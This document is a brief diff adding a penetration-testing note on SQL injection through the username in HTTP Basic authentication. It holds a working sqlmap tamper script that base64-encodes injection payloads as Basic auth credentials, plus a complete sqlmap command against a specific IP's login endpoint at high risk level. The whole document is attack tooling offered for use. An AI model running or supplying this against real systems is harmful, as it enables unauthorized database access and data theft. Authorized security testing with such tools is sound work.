@@ -1,0 +1,11 @@
+SQLmap for sqli in username param in basic auth'
+Put basicauth.py in tamper dir
+basicauth.py:
+import base64
+
+def tamper(payload, **kwargs):
+    auth = payload.encode() + b':password'
+    return base64.b64encode(auth).decode()
+
+SQLMap cmd:
+sqlmap.py -u "https://182.29.100.204/test/auth/login" --data="test=test" --headers="Authorization: Basic *" --tamper=./tamper/basicauth.py --risk 3 --proxy=http://127.0.0.1:8080 --ignore-code=401
